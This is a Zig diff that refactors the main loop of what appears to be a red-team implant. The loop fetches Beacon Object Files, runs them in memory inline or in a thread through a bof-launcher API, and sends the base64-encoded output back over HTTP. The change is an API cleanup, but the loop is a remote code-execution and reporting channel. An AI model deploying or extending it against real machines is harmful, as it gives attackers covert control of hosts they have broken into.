@@ -142,6 +142,8 @@ pub fn main() !u8 {
                 const bof_content = try fetchBofContent(allocator, bof_path);
                 defer allocator.free(bof_content);
 
+                const bof_object = try bof.Object.initFromMemory(bof_content.ptr, @intCast(bof_content.len));
+
                 // process header
                 const bof_header = root.object.get("header").?.string;
                 var iter_hdr = std.mem.tokenize(u8, bof_header, ":");
@@ -149,43 +151,30 @@ pub fn main() !u8 {
                 //TODO: handle 'buffers'
                 //const args_spec = iter_hdr.next() orelse return error.BadData;
 
-                var bof_handle: bof.Handle = undefined;
+                var bof_context: ?*bof.Context = null;
 
                 if (std.mem.eql(u8, exec_mode, "inline")) {
                     stdout.writer().print("Execution mode: {s}-based\n", .{exec_mode}) catch unreachable;
-                    _ = bof.load("dsfsdf", bof_content.ptr, @intCast(bof_content.len), &bof_handle);
-                    //defer bof.unload(bof_handle);
 
-                    var context: *bof.Context = undefined;
-                    _ = bof.run(
-                        bof_handle,
+                    bof_context = try bof_object.run(
                         @constCast(bof_args.ptr),
                         @intCast(bof_args.len),
-                        &context,
                     );
-
-                    //stdout.writer().print("Bof output:\n{s}", .{bof.getOutput(bof_handle).?}) catch unreachable;
                 } else if (std.mem.eql(u8, exec_mode, "thread")) {
                     stdout.writer().print("Execution mode: {s}-based\n", .{exec_mode}) catch unreachable;
 
-                    _ = bof.load("sgsfgr", bof_content.ptr, @intCast(bof_content.len), &bof_handle);
-                    //defer bof.unload(bof_handle);
-
-                    var context: *bof.Context = undefined;
-                    _ = bof.runAsync(
-                        bof_handle,
+                    bof_context = try bof_object.runAsync(
                         @constCast(bof_args.ptr),
                         @intCast(bof_args.len),
                         null,
                         null,
-                        &context,
                     );
-                    context.wait();
+                    bof_context.?.wait();
                 } else if (std.mem.eql(u8, exec_mode, "process")) {
                     stdout.writer().print("Execution mode: {s}-based\n", .{exec_mode}) catch unreachable;
                 }
 
-                if (bof.getOutput(bof_handle)) |bofOutput| {
+                if (bof_context != null) if (bof_context.?.getOutput()) |bofOutput| {
                     stdout.writer().print("Bof output:\n{s}", .{bofOutput}) catch unreachable;
                     var out_b64 = try allocator.alloc(u8, base64_encoder.calcSize(bofOutput.len));
                     defer allocator.free(out_b64);
@@ -205,8 +194,10 @@ pub fn main() !u8 {
                     try reqRes.writeAll(out_b64);
                     try reqRes.finish();
 
-                    bof.unload(bof_handle);
-                }
+                    bof_object.release();
+                    bof_context.?.release();
+                    bof_context = null;
+                };
 
                 // tasked to execute builtin command?
             } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
